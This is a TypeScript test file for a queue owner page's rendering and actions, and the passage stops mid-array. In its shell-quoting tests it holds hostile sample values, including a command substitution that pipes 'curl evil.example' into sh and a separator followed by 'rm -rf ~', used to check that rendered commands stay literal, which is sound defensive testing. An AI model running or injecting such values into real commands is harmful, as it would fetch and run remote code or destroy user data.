// Queue owner page: the nav slot, card precedence text, resume records and the card controls, read from the shipped
// queue.jsx through test/lib/render-screen.ts.
//
// Runner: npx tsx --test test/queue.owner-page.client.test.ts

import test, { describe } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { imageUploadQuerySchema, messageBodySchema, replyBodySchema } from "../src/server/queue/schemas.js";
import { getImageFacts } from "../src/server/queue/image-format.js";
import { IMAGE_BYTES_MAX } from "../src/server/queue/images.js";
import { collectText, findNodes, loadScreenModule, renderScreen, type RenderedNode } from "./lib/render-screen.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const QUEUE_SRC = resolve(__dirname, "../public/src/screens/queue.jsx");
const UI_SRC = resolve(__dirname, "../public/src/ui.jsx");
const realUiModule = (await loadScreenModule(UI_SRC)) as { UI: Record<string, unknown>; React: { createElement: (t: unknown, p: unknown) => unknown } };
const realUi = realUiModule.UI;
const realUiReact = realUiModule.React;

// window.UI stub — components resolve to transparent host elements; helpers and constants stay real.
function uiStub(): unknown {
  return new Proxy(
    {},
    {
      get: (_target, name: string) =>
        !/^[A-Z][a-z]/.test(name) && name in realUi
          ? realUi[name]
          : Object.defineProperty((props: Record<string, unknown>) => ({ __element: true, type: "ui-atom", props: { ...props, atom: name } }), "name", {
              value: name,
            }),
      has: () => true,
    },
  );
}

type Component = (props: unknown) => unknown;
interface ScreenModule {
  React: { createElement: (t: unknown, p: unknown, ...children: unknown[]) => unknown };
  [name: string]: unknown;
}

const screen = (await loadScreenModule(QUEUE_SRC, {
  URLSearchParams,
  window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
})) as ScreenModule;
// vm-realm values → this realm's prototypes, so deepEqual compares content
const getPlain = <T>(value: T): T => (value === undefined ? value : JSON.parse(JSON.stringify(value)));
const call = <T>(name: string, ...args: unknown[]): T => getPlain((screen[name] as (...a: unknown[]) => T)(...args));
const render = (name: string, props: unknown): RenderedNode => renderScreen(screen.React.createElement(screen[name] as Component, props)) as RenderedNode;

const SESSION_ID = "6f1c2a9e-4b7d-4e21-9a3f-0c5d8e7b1a42";
const CLI_PATH = "/Volumes/tools/atrium/scripts/atrium-queue.sh";
const READY_RESUMES = { status: "ready", data: [], error: null, busy: false };

function buildSession(overrides: Record<string, unknown> = {}) {
  return {
    id: SESSION_ID,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    configDir: null,
    state: "exited",
    isWaiting: false,
    permissionHint: "default",
    marker: null,
    ...overrides,
  };
}

function buildItem(overrides: Record<string, unknown> = {}) {
  return {
    id: 41,
    kind: "decision",
    title: "Pick the migration order",
    body: "Two orders keep the shadow DB green.",
    linkedDocIds: [],
    options: [
      { code: "R1", label: "Schema first", pros: "one deploy", cons: "longer lock" },
      { code: "R2", label: "Data first", pros: "short lock", cons: "two deploys" },
    ],
    recommendedCode: "R2",
    isFreeTextAllowed: true,
    isApprovalClass: false,
    status: "open",
    queuePosition: 7,
    deferCount: 0,
    nextAttempt: 1,
    answer: { code: null, text: null },
    askedAt: "2026-11-10T06:12:43.518Z",
    answeredAt: null,
    deliveredAt: null,
    session: buildSession(),
    resumes: [],
    deviation: null,
    skipReason: null,
    canResend: false,
    ...overrides,
  };
}

function buildQueue(overrides: Record<string, unknown> = {}) {
  const calls: unknown[][] = [];
  const record = (name: string) => (...args: unknown[]) => calls.push([name, ...args]);
  return {
    calls,
    queue: {
      busy: { id: null, error: null },
      resumes: READY_RESUMES,
      readResumes: record("readResumes"),
      drafts: {},
      setDraft: record("setDraft"),
      later: record("later"),
      send: record("send"),
      answerItem: record("answerItem"),
      settle: record("settle"),
      selectRow: record("selectRow"),
      sessions: buildSessions(),
      orders: { isOpen: false, open: record("openOrders") },
      reload: record("reload"),
      ...overrides,
    },
  };
}

// the queue with a loaded list, its bands and the first row selected, as useQueueStateQ hands it to the desk
function withList(queue: Record<string, unknown>, items: unknown[], nextCursor: number | null = null) {
  const groups = call<Array<{ rows: Array<{ id: number }> }>>("getGroupsQ", items);
  return { ...queue, list: { status: "ready", data: { items, nextCursor }, newIds: [] }, filter: { profile: "", session: "" }, setFilter: () => undefined, groups, sheet: getSheet(groups, ""), selectedId: groups[0]?.rows[0]?.id ?? null, status: "" };
}

const getSheet = (groups: unknown, hashId: string) => call<{ id: number | null }>("getSheetStateQ", groups, hashId, { item: null, isHandled: false });

// the Card atom's head and foot ride its props → rendered beside its body, so one tree holds the whole sheet
function renderSheet(props: unknown): RenderedNode {
  const tree = render("ItemSheetQ", props);
  const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
  const slots = ["title", "sub", "right", "foot"].map((key) => renderScreen(card?.props[key])).filter((node): node is RenderedNode => node !== null && typeof node !== "string");
  return { type: "Fragment", props: {}, children: [tree, ...slots] } as RenderedNode;
}

const buttonLabelled = (tree: RenderedNode, label: string) => findNodes(tree, (node) => node.type === "button" && collectText(node).trim() === label);

describe("queue nav slot", () => {
  const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations, oldestAgeSeconds: 120 } });
  const rows = [
    { name: "a count never read gives no slot, so no zero that was not loaded", countState: { status: "loading" }, expected: undefined },
    { name: "an unread count shows a question mark rather than a blank badge", countState: { status: "error" }, expected: ["?"] },
    { name: "zero awaiting still shows the numeral", countState: ready(0, 0), expected: ["0"] },
    { name: "a count with deviations shows the awaiting numeral alone", countState: ready(2, 1), expected: ["2"] },
    { name: "a count answer without numbers reads as unread", countState: { status: "ready", data: { rows: [] } }, expected: ["?"] },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const slot = call<{ queue?: { badges: Array<{ badge: string; icon?: string }> } }>("getQueueNavBadge", row.countState);
      assert.deepEqual(slot.queue?.badges.map((badge) => badge.icon ?? badge.badge), row.expected);
    });
  }

  test("the deviation glyph rides the count only while a deviation is open", () => {
    const glyphOf = (deviations: number) =>
      call<{ queue: { badges: Array<{ glyph?: string; description: string }> } }>("getQueueNavBadge", ready(4, deviations)).queue.badges[0];
    assert.equal(glyphOf(0)?.glyph, undefined);
    assert.equal(glyphOf(2)?.glyph, (realUi.TONE_GLYPH as Record<string, string>).warn);
    assert.equal(glyphOf(2)?.description, "4 awaiting you, 2 deviations");
  });

  // a background tab shows what waits; a count of nothing, or one not read, adds nothing to the title
  const titleRows = [
    { name: "items awaiting lead the title with their count", countState: ready(7, 0), expected: "(7) Queue · Atrium Monitor" },
    { name: "nothing awaiting leaves the count out", countState: ready(0, 0), expected: "Queue · Atrium Monitor" },
    { name: "a count not read yet leaves the count out", countState: { status: "loading" }, expected: "Queue · Atrium Monitor" },
    { name: "a failed count read leaves the count out", countState: { status: "error", data: { awaiting: 3, deviations: 0 } }, expected: "Queue · Atrium Monitor" },
  ];
  for (const row of titleRows) {
    test(`document title: ${row.name}`, () => assert.equal(call("getQueueTitle", row.countState, "Atrium Monitor"), row.expected));
  }
});

describe("Later", () => {
  test("Later moves the item to the end and keeps the others in queue order", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" }), buildItem({ id: 3 })];
    const ids = (list: Array<{ id: number }>) => list.map((item) => item.id);
    assert.deepEqual(ids(call("putLaterQ", items, 1)), [2, 3, 1]);
    assert.deepEqual(ids(call("putLaterQ", items, 2)), [1, 3, 2]);
  });

  const kinds = [
    { name: "a decision's sheet offers Answer later", kind: "decision", label: "Answer later" },
    { name: "a report's sheet offers Read later", kind: "report", label: "Read later" },
  ];
  for (const row of kinds) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const tree = renderSheet({ item: buildItem({ id: 9, kind: row.kind }), queue });
      const [later] = buttonLabelled(tree, row.label);
      assert.ok(later, "Later button rendered");
      (later.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), [["later", 9]]);
    });
  }
});

describe("after Send the focus moves to the next awaiting card", () => {
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" }), buildItem({ id: 3 }), buildItem({ id: 4 })];
  const rows = [
    { name: "skips a card no longer awaiting", id: 1, expected: 3 },
    { name: "wraps to the first awaiting card from the last", id: 4, expected: 1 },
    { name: "no other awaiting card leaves the focus where it is", id: 1, list: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getNextAwaitingIdQ", row.list ?? items, row.id), row.expected));
});

test("after Send the focus skips a card the active filter hides", async () => {
  const module = (await loadScreenModule(QUEUE_SRC, {
    window: { UI: uiStub() },
    fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
  })) as ScreenModule;
  const personal = buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal" });
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, session: personal }), buildItem({ id: 3 })];
  const focus: unknown[] = [];
  const actions = (module.useQueueActionsQ as (deps: unknown) => { answerItem: (id: number, body: unknown) => Promise<void> })({
    list: { status: "ready", data: { items, nextCursor: null } },
    filter: { profile: "work-dev", session: "" },
    setList: () => undefined,
    setDrafts: () => undefined,
    setFocus: (next: unknown) => focus.push(next),
    setStatus: () => undefined,
    selectItem: () => undefined,
    reload: () => undefined,
  });
  await actions.answerItem(1, { code: "R1" });
  assert.deepEqual(getPlain(focus), [{ id: 3 }]);
});

test("a draft held in page state reappears when its item is selected again", () => {
  const { queue } = buildQueue({ drafts: { 41: { text: "keep the shadow DB" } } });
  const tree = renderSheet({ item: buildItem(), queue });
  const [field] = findNodes(tree, (node) => node.type === "textarea");
  assert.equal(field?.props.value, "keep the shadow DB");
});

// one word per recipient: received, not yet, or — only when the queue recorded it did not get there — not received
describe("receipt words", () => {
  // the facts render as a list of siblings → held in one host element, as the letterhead's slot holds them
  const factsText = (item: unknown) => collectText(renderScreen(screen.React.createElement("p", null, screen.React.createElement(screen.LetterheadFactsQ as Component, { item }))) as RenderedNode);
  const rows = [
    { name: "an acknowledged order is received", item: { status: "delivered", deliveredAt: "2026-11-12T12:28:04.311Z" }, word: "Received" },
    { name: "an answer waiting for its pull is not yet received", item: { status: "answered" }, word: "Not yet" },
    { name: "an order handed over and not acknowledged yet is not yet received", item: { status: "delivering" }, word: "Not yet" },
    { name: "a held order is not yet received", item: { status: "held", deviation: "held" }, word: "Not yet" },
    { name: "an order whose automatic resume is still to come is not yet received", item: { status: "resume_pending", deviation: "resume_pending" }, word: "Not yet" },
    { name: "an order its session never acknowledged is not received", item: { status: "unacked", deviation: "unacked", canResend: true }, word: "Not received" },
    { name: "an unacknowledged order is not received while its session is marked for a resume", item: { status: "unacked", deviation: "unacked" }, word: "Not received" },
    { name: "an expired order is not received", item: { status: "expired", deviation: "expired", canResend: true }, word: "Not received" },
    { name: "an order whose automatic resume is used is not received", item: { status: "resume_pending", deviation: "resume_pending", canResend: true }, word: "Not received" },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const item = buildItem({ kind: "message", answeredAt: "2026-11-12T12:26:40.118Z", ...row.item });
      const text = factsText(item);
      assert.ok(text.includes(row.word) && !(row.word === "Not yet" && text.includes("received")), text);
    });
  }

  test("no surface names a deviation by its queue status", () => {
    const words = /Unacked|Held|Expired|Resume pending|Session not reachable|Delivery off/;
    for (const status of ["unacked", "held", "expired", "resume_pending"]) {
      const item = buildItem({ kind: "message", status, deviation: status, answeredAt: "2026-11-12T12:26:40.118Z" });
      const text = `${factsText(item)} ${collectText(render("CardStateQ", { item, cliPath: CLI_PATH }))}`;
      assert.doesNotMatch(text, words, text);
    }
  });

  const rollUps = [
    { name: "some copies received counts them", statuses: ["delivered", "answered", "delivering"], facts: ["1 of 3 received"] },
    { name: "every copy waiting reads not yet", statuses: ["answered", "delivering", "held"], facts: ["Not yet"] },
    { name: "a copy not received follows the count as its own warning", statuses: ["delivered", "unacked", "answered"], facts: ["1 of 3 received", "1 not received"] },
  ];
  for (const row of rollUps) {
    test(`an order to several sessions rolls up its receipts: ${row.name}`, () => {
      const copies = row.statuses.map((status, index) => buildItem({ id: 90 + index, kind: "message", status, sendId: "send-1", answeredAt: "2026-11-12T12:26:40.118Z" }));
      const facts = call<Array<{ text: string }>>("getRowFactsQ", { item: copies[0], copies }, false).map((fact) => fact.text);
      assert.deepEqual(facts, ["Order", ...row.facts]);
    });
  }
});

describe("card state lines", () => {

  // an answered item waits for its session's pull → the owner learns whether a wait takes it, else how to pull it
  const pullRows = [
    { name: "a live session that is waiting takes the answer at its next poll", status: "answered", session: { state: "live", isWaiting: true }, isWaitNamed: true, hasCommand: false },
    { name: "a live session that is not waiting shows the pull command", status: "answered", session: { state: "live", isWaiting: false }, isWaitNamed: false, hasCommand: true },
    { name: "an ended session is resumed, so neither line shows", status: "answered", session: { state: "exited", isWaiting: false }, isWaitNamed: false, hasCommand: false },
    { name: "an unanswered item has nothing to pull", status: "open", session: { state: "live", isWaiting: false }, isWaitNamed: false, hasCommand: false },
  ];
  for (const row of pullRows) {
    test(`pull line: ${row.name}`, () => {
      const text = collectText(render("CardStateQ", { item: buildItem({ status: row.status, session: buildSession(row.session) }), cliPath: CLI_PATH }));
      assert.equal(text.includes("The session is waiting"), row.isWaitNamed, text);
      assert.equal(text.includes(`${CLI_PATH} pending`), row.hasCommand, text);
    });
  }

  const ANSWERED_AT = "2026-11-12T04:05:17.482Z";
  const answered = (overrides: Record<string, unknown>) => buildItem({ status: "delivered", answeredAt: ANSWERED_AT, isAnsweredOutside: false, ...overrides });
  // the line names when, by which route and on which request signal; only an unrecorded answer is flagged
  const answerRows = [
    { name: "an answer on fetch metadata", item: answered({ answerRecord: { route: "answer", signal: "fetch_metadata" } }), words: ["Answered", "same-origin request"], isFlagged: false },
    { name: "a reply on the Origin header alone", item: answered({ kind: "report", answerRecord: { route: "reply", signal: "origin" } }), words: ["Replied", "Origin header"], isFlagged: false },
    { name: "an owner message", item: answered({ answerRecord: { route: "message", signal: "fetch_metadata" } }), words: ["Sent as a message"], isFlagged: false },
    { name: "an answer from before the record", item: answered({ answerRecord: { route: "answer", signal: "before_record" } }), words: ["Answered", "before answers were recorded"], isFlagged: false },
    { name: "an answer with no record", item: answered({ answerRecord: null, isAnsweredOutside: true }), words: ["Answered outside the Queue page"], isFlagged: true },
  ];
  for (const row of answerRows) {
    test(`answer record line: ${row.name}`, () => {
      const tree = render("CardStateQ", { item: row.item });
      const text = collectText(tree);
      for (const word of row.words) assert.ok(text.includes(word), text);
      assert.ok(text.includes((realUi.formatKstDateTime as (iso: string) => string)(ANSWERED_AT)), text);
      assert.equal(findNodes(tree, (node) => /\btext-warn\b/.test(String(node.props?.className ?? ""))).length, row.isFlagged ? 1 : 0, text);
    });
  }

  test("an item with no answer carries no answer record line", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ answerRecord: null, isAnsweredOutside: false }) }));
    assert.doesNotMatch(text, /Answered|Replied|Sent as/);
  });

  test("an approval-class decision's note slot says to confirm once more in the session's terminal", () => {
    const text = (item: unknown) => collectText(render("SheetFootQ", { item, draft: {}, queue: buildQueue().queue, isBusy: false, error: null }));
    assert.match(text(buildItem({ isApprovalClass: true })), /Approval: after you answer here, confirm once more in git\/glass-atrium's terminal\./);
    assert.doesNotMatch(text(buildItem()), /confirm once more/);
  });
});

describe("card precedence notes", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  // a note's parts: a string is prose, { machine } renders through MachineString
  const markedLine = [
    "waiting on personal · wt/owner-queue · ",
    { machine: "9b2e7c41" },
    ", whose automatic resume has not registered: this one waits until that session registers " +
      "or is resumed in a terminal (see its card), and resumes automatically once that session has then ended",
  ];
  const generic = ["another session is live or resuming in this worktree: this one resumes automatically once that one has ended"];
  const capturedIdNote = [
    "the resumed session may still be running in the background: under profile work-dev, check it with ",
    { machine: "claude logs bg-7f3a" },
    ", and resume it yourself in a terminal only after ",
    { machine: "claude stop bg-7f3a" },
  ];
  const markedSession = (bgId: string | null, configDir: string | null = null) =>
    buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId }, configDir });
  const pending = (skipReason: unknown, extra: Record<string, unknown> = {}) => buildItem({ status: "resume_pending", skipReason, ...extra });
  const rows = [
    { name: "a used attempt asks for Resend", item: pending({ kind: "resume_used" }), expected: [["automatic resume used — Resend to try again"]] },
    { name: "an approval item needs the terminal", item: pending({ kind: "approval" }), expected: [["approval needs your terminal: resume the session yourself"]] },
    { name: "a resume in flight shows no text", item: pending({ kind: "in_flight" }), expected: [] },
    { name: "no marked occupant gives the generic worktree line", item: pending({ kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true }), expected: [generic] },
    { name: "a marked occupant is named", item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false }), expected: [markedLine] },
    {
      name: "a marked and a live occupant give the marked line then the generic line",
      item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: true }),
      expected: [markedLine, generic],
    },
    { name: "the captured-id marker form names the bg id and the profile", item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }), expected: [capturedIdNote] },
    {
      name: "the listing marker form names the cwd and the full session id",
      item: pending({ kind: "marker" }, { session: markedSession(null) }),
      expected: [
        [
          "the resumed session may still be running in the background: under profile work-dev, check ",
          { machine: "claude agents --json --cwd /Users/owner/Desktop/git/glass-atrium" },
          " for the entry of session ",
          { machine: SESSION_ID },
          ", and resume it yourself in a terminal only once that entry is no longer listed, or after ",
          { machine: "claude stop <id>" },
          " with that entry's id",
        ],
      ],
    },
    {
      name: "the marker on an unacked card of a marked session replaces any skip text",
      item: buildItem({ status: "unacked", deviation: "unacked", session: markedSession("bg-7f3a") }),
      expected: [capturedIdNote],
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getCardNotesQ", row.item), row.expected));

  const configRows = [
    { name: "captured-id form carries the recorded config dir in each command", bgId: "bg-7f3a" },
    { name: "listing form carries the recorded config dir in each command", bgId: null },
  ];
  for (const row of configRows) {
    test(row.name, () => {
      const [note] = call<Array<Array<string | { machine: string }>>>("getCardNotesQ", buildItem({ session: markedSession(row.bgId, "/Users/owner/.claude-work-dev") }));
      const commands = (note ?? []).flatMap((part) => (typeof part === "string" || !part.machine.includes("claude ") ? [] : [part.machine]));
      assert.equal(commands.length, 2, String(commands));
      for (const command of commands) assert.ok(command.startsWith("CLAUDE_CONFIG_DIR=/Users/owner/.claude-work-dev claude "), command);
    });
  }

  // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
  const shellWordRows = [
    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", shellWord: "/Users/owner/Desktop/git/glass-atrium" },
    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", shellWord: "'/Users/owner/My Repos/app'" },
    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", shellWord: "'/tmp/x$(curl evil.example|sh)'" },
    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", shellWord: "'/tmp/a; rm -rf ~'" },
    { name: "a backtick stays literal", value: "/tmp/`id`", shellWord: "'/tmp/`id`'" },
    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", shellWord: "'/tmp/it'\\''s'" },
  ];
  for (const row of shellWordRows) {
    test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
      const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
      const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
      const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
      const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
      const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", session: buildSession({ state: "live" }) }), cliPath: row.value }));
      assert.equal(cwdCommand, `claude agents --json --cwd ${row.shellWord}`);
      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.shellWord} claude `)), JSON.stringify(listing));
      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.shellWord}`), JSON.stringify(captured));
      assert.ok(pull.includes(`${row.shellWord} pending`), pull);
    });
  }

  test("a note's commands and ids render through MachineString and its prose carries no backticks", () => {
    const tree = render("CardStateQ", { item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }) });
    const machine = findNodes(tree, (node) => node.props.atom === "MachineString").map((node) => collectText(node));
    assert.deepEqual(machine, ["claude logs bg-7f3a", "claude stop bg-7f3a"]);
    assert.doesNotMatch(collectText(tree), /`/);
  });

  test("a marked session with a used attempt shows the marker reason and no Resend", () => {
    const item = pending({ kind: "marker" }, { session: markedSession("bg-7f3a"), canResend: false, resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: "bg-7f3a" }] });
    const tree = renderSheet({ item, queue: buildQueue().queue });
    assert.match(collectText(tree), /claude logs bg-7f3a/);
    assert.equal(buttonLabelled(tree, "Resend answer").length, 0);
  });

  test("a used attempt in a shared worktree shows the used state with Resend answer", () => {
    const item = pending({ kind: "resume_used" }, { canResend: true });
    const { calls, queue } = buildQueue();
    const tree = renderSheet({ item, queue });
    assert.match(collectText(tree), /automatic resume used — Resend to try again/);
    const [resend] = buttonLabelled(tree, "Resend answer");
    (resend?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "resend"]]);
  });
});

describe("automatic resume record", () => {
  const rows = [
    { name: "a spawn", resume: { result: "sent", abortReason: null }, expected: "spawned" },
    { name: "a failed spawn", resume: { result: "failed", abortReason: null }, expected: "failed" },
    { name: "an abort because the session came back", resume: { result: "aborted", abortReason: "session_returned" }, expected: "not spawned: session came back" },
    { name: "an abort for a shared worktree", resume: { result: "aborted", abortReason: "shared_worktree" }, expected: "not spawned: another session in this worktree" },
  ];
  for (const row of rows) test(`result label: ${row.name}`, () => assert.equal(call("getResumeResultLabelQ", row.resume), row.expected));

  test("each card resume shows its time, account and result", () => {
    const resume = { attempt: 2, sentAt: "2026-11-10T06:20:11.204Z", result: "aborted", abortReason: "session_returned", bgId: null };
    const text = collectText(renderSheet({ item: buildItem({ status: "resume_pending", resumes: [resume] }), queue: buildQueue().queue }));
    const line = text.split("Automatic resume ")[1] ?? "";
    assert.ok(line.startsWith((realUi.formatKstDateTime as (iso: string) => string)(resume.sentAt)), line);
    assert.match(line, /work-dev · attempt 2 · not spawned: session came back/);
  });

});

describe("recent automatic resumes", () => {
  const row = (itemId: number, title: string, attempt: number, result: string) => ({
    attempt,
    sentAt: "2026-11-10T06:40:00.870Z",
    result,
    abortReason: null,
    bgId: null,
    item: { id: itemId, title },
    session: { profileLabel: ".claude-work", cwdTail: "atrium/hooks" },
  });

  test("the record lists the server's resume rows in its order, each with account, worktree and item title", () => {
    const resumes = [row(9, "Pick the lock order", 2, "acked"), row(4, "Pick the index", 1, "sent")];
    const text = collectText(render("RecentResumesQ", { region: { ...READY_RESUMES, data: resumes }, onRetry: () => undefined }));
    const lines = text.split("Automatic resume ").slice(1);
    assert.equal(lines.length, 2, text);
    assert.match(lines[0] ?? "", /\.claude-work · atrium\/hooks · attempt 2 · spawned · acknowledged\s+— Pick the lock order/);
    assert.match(lines[1] ?? "", /attempt 1 · spawned\s+— Pick the index/);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable", isShown: true },
    { name: "an empty record shows nothing", region: READY_RESUMES, atom: "DetailSurface", isShown: false },
    { name: "a first read in flight shows nothing", region: { status: "loading", data: null, error: null, busy: true }, atom: "DetailSurface", isShown: false },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("RecentResumesQ", { region: view.region, onRetry: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length > 0, view.isShown);
    });
  }

  test("the record is read from the resume route, whatever the owner list holds", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ resumes: [row(9, "Pick the lock order", 1, "acked")] }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    const setResumes = (next: (prev: unknown) => unknown) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    assert.deepEqual(urls, ["/api/queue/owner/resumes"]);
    assert.deepEqual((getPlain(region) as { data: Array<{ item: { id: number } }> }).data.map((resume) => resume.item.id), [9]);
  });
});

describe("screen", () => {
  test("the Queue screen renders its header and a loading body before the first read", () => {
    const tree = render("ScreenQueue", {});
    const atoms = findNodes(tree, (node) => node.type === "ui-atom").map((node) => node.props.atom);
    assert.ok(atoms.includes("PageHeader"), String(atoms));
    assert.ok(atoms.includes("LoadingPlaceholder"), String(atoms));
  });

  // the list carries no delivery flag → a page alert here would read as a delivery outage that does not exist
  test("a loaded list renders one list card with one row per item under bands, and the selected item on the sheet", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })];
    const queue = withList(buildQueue().queue, items);
    const list = render("QueueListQ", { queue });
    assert.deepEqual(findNodes(list, (node) => node.props?.role === "option").map((node) => node.props.id), ["queue-row-1", "queue-row-2"]);
    assert.deepEqual(findNodes(list, (node) => node.props?.className === "queue-band").map((node) => collectText(node)), ["Decisions 1", "Reports 1"]);
    assert.equal(findNodes(list, (node) => node.props?.atom === "AlertCard").length, 0);
    const sheet = render("QueueSheetQ", { queue: { ...queue, sheet: getSheet(queue.groups, "2") } });
    const [link] = findNodes(sheet, (node) => node.type === "a" && node.props.className === "prose-link");
    assert.equal(link?.props.href, "#clauded-docs?doc=43944");
  });
});

describe("an owner action's answer", () => {
  const draft = { 41: { code: "R2", text: "keep the shadow DB" } };
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    let drafts: Record<string, unknown> = { ...draft };
    let busy: unknown = null;
    const counts = { reload: 0 };
    const isDone = await (module.sendActionQ as (deps: unknown) => Promise<boolean>)({
      id: 41,
      action: "answer",
      body: { code: "R2", text: "keep the shadow DB" },
      setBusy: (next: unknown) => { busy = next; },
      setDrafts: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { drafts = next(drafts); },
      reload: () => { counts.reload += 1; },
    });
    return { isDone, drafts: getPlain(drafts), busy: getPlain(busy), posts: getPlain(posts), reloads: counts.reload };
  };

  test("a taken answer posts the card's body, clears its draft and re-reads the list", async () => {
    const result = await run(200, { ok: true });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/items/41/answer", body: { code: "R2", text: "keep the shadow DB" } }]);
    assert.equal(result.isDone, true);
    assert.equal(result.drafts[41], undefined);
    assert.equal(result.reloads, 1);
  });

  const refusals = [
    {
      name: "a page-origin refusal keeps the draft and shows on the card",
      status: 403,
      body: { error: "forbidden" },
      error: { id: 41, message: "The monitor refused this action. Refresh and try again." },
    },
    {
      name: "a refusal keeps the draft and shows the reason on the card",
      status: 400,
      body: { error: "unknown_option", reason: "the code is not one of this item's options" },
      error: { id: 41, message: "Refused: the code is not one of this item's options." },
    },
  ];
  for (const row of refusals) {
    test(row.name, async () => {
      const result = await run(row.status, row.body);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.drafts, draft);
      assert.deepEqual(result.busy, { id: null, error: row.error });
      assert.equal(result.reloads, 0);
    });
  }
});

describe("sheet composer buttons", () => {
  const foot = (item: unknown, draft: unknown) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item, draft, queue, isBusy: false, error: null }) };
  };
  const press = (tree: RenderedNode, label: string) => {
    const [button] = buttonLabelled(tree, label);
    assert.ok(button, `${label} rendered`);
    assert.equal(button.props.disabled, undefined, `${label} is always enabled`);
    (button.props.onClick as () => void)();
  };

  const sendRows = [
    { name: "no option and no text writes the note-slot line", draft: {}, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "whitespace-only text writes the note-slot line", draft: { text: "   " }, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "a picked option alone sends its code", draft: { code: "R1" }, calls: [["answerItem", 41, { code: "R1" }]] },
    { name: "text alone sends the text", draft: { text: "hold until Friday" }, calls: [["answerItem", 41, { text: "hold until Friday" }]] },
    { name: "an option and text send both", draft: { code: "R2", text: "after the deploy" }, calls: [["answerItem", 41, { code: "R2", text: "after the deploy" }]] },
  ];
  for (const row of sendRows) {
    test(`Send answer: ${row.name}`, () => {
      const { calls, tree } = foot(buildItem(), row.draft);
      press(tree, "Send answer");
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  const reportRows = [
    { name: "Mark as read on an empty box sends the seen action", draft: {}, label: "Mark as read", calls: [["settle", 41, "seen"]] },
    { name: "Mark as read with text in the box says the order is unsent", draft: { text: "thanks" }, label: "Mark as read", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order sends the reply action with the typed text", draft: { text: "thanks, merged" }, label: "Send order", calls: [["settle", 41, "reply", { text: "thanks, merged" }]] },
